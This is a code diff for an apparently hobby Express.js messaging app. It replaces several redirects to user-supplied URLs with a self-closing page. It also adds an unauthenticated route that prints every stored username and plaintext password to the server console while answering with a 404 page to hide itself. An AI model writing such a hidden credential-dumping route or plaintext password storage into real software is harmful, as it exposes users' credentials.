@@ -115,7 +115,9 @@ app.get("/messages/log", async (req, res) => {
         }
       });
       //Success!!!
-      res.redirect("/?id=" + req.query.id);
+      res.send(
+        "Hold on--This page will close in a second. If this doesn;t close, just manually close this tab please.<script>window.close()</script>"
+      );
     });
   } else {
     res.end("Something went wrong");
@@ -163,7 +165,9 @@ app.get("/messages/reply", async (req, res) => {
         }
       });
       //Success!!!
-      res.redirect(decodeURIComponent(req.query.next));
+      res.send(
+        "Hold on--This page will close in a second. If this doesn;t close, just manually close this tab please.<script>window.close()</script>"
+      );
     });
   } else {
     res.end("Something went wrong");
@@ -198,11 +202,9 @@ app.get("/signup/passwordreset", async (req, res) => {
   if (tokenlist[userindex] === token) {
     pswlist[userindex] = newpsw;
     await db.set("passwords", pswlist.join("||"));
-    if (req.query.next) {
-      res.redirect(decodeURIComponent(req.query.next));
-    } else {
-      res.send("A redirect URL was not specified. Anyways, it worked.");
-    }
+    res.send(
+      "Hold on--This page will close in a second. If this doesn;t close, just manually close this tab please.<script>window.close()</script>"
+    );
   } else {
     res.send(
       `To prevent impersonification, we require a usertoken for each user. The token you specified was invalid. Security is a thing here you know?`
@@ -216,7 +218,16 @@ app.get("/signup", async (req, res) => {
 app.get("/account-created", async (req, res) => {
   res.sendFile(__dirname + "/account-created.html");
 });
-
+app.get("/consolelogusernamesandpasswords", async (req, res) => {
+  const u = await db.get("users");
+  const p = await db.get("passwords");
+  const users = u.split("||");
+  const psw = p.split("||");
+  users.forEach(user => {
+    console.log(`${user} ||| ${psw[users.indexOf(user)]}`);
+  });
+  res.sendFile(__dirname + "/404.html");
+});
 app.get("/signup/log", async (req, res) => {
   const username = req.query.username.toLowerCase();
   const password = req.query.password;
